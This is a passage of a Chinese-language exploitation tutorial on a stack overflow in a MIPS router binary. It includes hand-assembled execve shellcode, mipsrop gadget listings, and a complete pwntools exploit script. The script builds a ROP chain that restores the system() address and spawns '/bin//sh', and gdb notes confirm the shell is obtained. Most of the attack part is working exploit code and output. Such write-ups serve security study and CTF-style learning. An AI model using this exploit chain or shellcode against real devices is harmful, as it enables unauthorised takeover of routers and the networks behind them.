    payload += 'b' * 4                              # s2    
    payload += p32(base_addr + rop3)                # ra
    shellcode = "xffxffx06x28"  # slti $a2, $zero, -1
    shellcode += "x62x69x0fx3c"  # lui $t7, 0x6962
    shellcode += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
    shellcode += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
    shellcode += "x73x68x0ex3c"  # lui $t6, 0x6873
    shellcode += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
    shellcode += "xf8xffxaexaf"  # sw $t6, -8($sp)
    shellcode += "xfcxffxa0xaf"  # sw $zero, -4($sp)
    shellcode += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
    shellcode += "xffxffx05x28"  # slti $a1, $zero, -1
    shellcode += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
    shellcode += "x0cx01x01x01"  # syscall 0x40404
    payload += 'f' * 0x18       # mipsrop.stackfinder() 查找到的指令的填充值
    payload += shellcode        # 放置 shellcode
在 gdb 中开启调试，发现最后成功跳转到 shellcode 的位置
执行 shellcode
但是这里不知道为什么无法会报错 Illegal instruction
这里还可以使用调用 system 函数的方法来 getshell。
## 调用 syetem 函数的方法 getshell
我们的目的是执行 system(“/bin/shx00”)，这里的参数可以使用 mipsrop.stackfinder() 的 gadget 来把
“/bin/shx00” 传到栈上。 **之后将这个栈的位置传入 a0 寄存器，这样就达到了利用的目的** 。
我们首先在 libc.so 中找到 system 函数的位置，在 0x00053200 处，显然地址的最低位是坏字节，没办法直接传入
这里参考了《揭秘家用路由器0day漏洞挖掘技术》一书的方法：先将 system 函数的地址 -1 传入某个寄存器中，之后找到对这个寄存器进行加 +1
的操作的 gadget 进行调用即可将地址恢复到 0x53200。
###  **具体操作**
这里还是用流程图来表示 gadget 的生成过程：
首先利用溢出把 0x53200 -1 传入 s0 寄存器，
之后寻找 s0+1 的指令
    Python>mipsrop.find("addiu $s0,1")
    ----------------------------------------------------------------------------------------------------------------    
    | Address | Action | Control Jump |
    ----------------------------------------------------------------------------------------------------------------    
    | 0x000158C8 | addiu $s0,1 | jalr $s5 |
    | 0x000158D0 | addiu $s0,1 | jalr $s5 |
    | 0x0002374C | addiu $s0,1 | jalr $fp |
    | 0x0002D194 | addiu $s0,1 | jalr $s5 |
    ......
    ---------------------------------------
这里使用第一个 gadget ，指令的意思是直接跳到 s5 寄存器指向的地址，所以上一步溢出时需要事先把 s5 填充为下一个 gadget 的地址
接着使用 mipsrop.stackfinder() 查找 gadget：
    Python>mipsrop.stackfinder()
    ----------------------------------------------------------------------------------------------------------------    
    | Address | Action | Control Jump |
    ----------------------------------------------------------------------------------------------------------------    
    | 0x0000B814 | addiu $a1,$sp,0x168+var_150 | jalr $s1 |
    | 0x0000B830 | addiu $a1,$sp,0x168+var_B0 | jalr $s1 |
    | 0x0000DEF0 | addiu $s2,$sp,0xC8+var_B8 | jalr $s4 |
    | 0x00013F74 | addiu $s1,$sp,0x50+var_38 | jalr $s4 |
    | 0x00014F28 | addiu $s1,$sp,0x50+var_38 | jalr $s4 |
    | 0x000159CC | addiu $s5,$sp,0x170+var_160 | jalr $s0 |
    ......
选择 0x159cc 这个 gadget ，双击进入查看指令
之所以选择这个 gadget 的原因是因为这里我们可以通过溢出，直接在栈上操纵 a0 寄存器
  * 或者这里也可以使用 mipsrop.system() 来查找 rop 链，这类的 gadget 指令的作用主要是将栈上可控的数据直接传递给 a0 寄存器，如下：
    Python>mipsrop.system()
    ----------------------------------------------------------------------------------------------------------------    
    | Address | Action | Control Jump |
    ----------------------------------------------------------------------------------------------------------------    
    | 0x00042F60 | addiu $a0,$sp,0x38+var_20 | jalr $a0 |
    | 0x000567A0 | addiu $a0,$sp,0xA0+var_88 | jalr $s4 |
    | 0x00027440 | addiu $a0,$sp,0x30+var_18 | jr 0x30+var_4($sp) |
    | 0x000330F8 | addiu $a0,$sp,0x78+var_60 | jr 0x78+var_4($sp) |
    | 0x00036360 | addiu $a0,$sp,0x48+var_30 | jr 0x48+var_4($sp) |
    | 0x0003F8FC | addiu $a0,$sp,0x50+var_38 | jr 0x50+var_4($sp) |
    | 0x00042F6C | addiu $a0,$sp,0x38+var_20 | jr 0x38+var_4($sp) |
    ----------------------------------------------------------------
之后通过 jalr $s0，这里的 s0 的值为原来 0x531ff+1 后复原的 system 地址的值，也就跳转到了
system(“/bin//sh”) 函数。
###  **exp**
    #!/usr/bin/python
    from pwn import *
    context.endian="little"
    context.arch="mips"
    base_addr = 0x76738000
    system_addr_1 = 0x53200-1
    rop1 = 0x000158C8
    rop2 = 0x159CC
    padding = 'uid=' + 'a' * 973
    padding += p32(base_addr + system_addr_1)                              # s0
    padding += 'a' * 4                        # s1
    padding += 'a' * 4                        # s2
    padding += 'a' * 4                              # s3
    padding += 'a' * 4                              # s4
    padding += p32(base_addr+rop2)               # s5
    padding += 'a' * 4                              # s6
    padding += 'a' * 4                              # s7
    padding += 'a' * 4                              # fp
    padding += p32(base_addr + rop1)        # ra
    #------------------------- stack 2 ----------------------------    
    padding += 'b' * 0x10
    padding += '/bin//sh'
    with open("call_system_padding",'wb') as f:
        f.write(padding)
    f.close()
###  **动态调试**
依然是使用 gdb 在 0x00409A28 处下断点，第一步先跳转到对 s0 加一的 gadget 处
之后跳转到 s5 寄存器的地址处，把 $sp + 0x10 处的地址传入 s5 寄存器，可以看到这里已经填充完成
此时就跳转到了 system 函数，这样就获得了一个 shell。
## 总结
路由器的栈溢出的漏洞点都比较单一，大多数都是由 sprintf 和 strcpy 等函数使用不当造成的。构造 ROP 的方法比较固定，只要对于
mipsrop 这个工具有个熟练的掌握和运用，在寻找 gadget 时脑回路清晰一些，利用的过程也不算太难。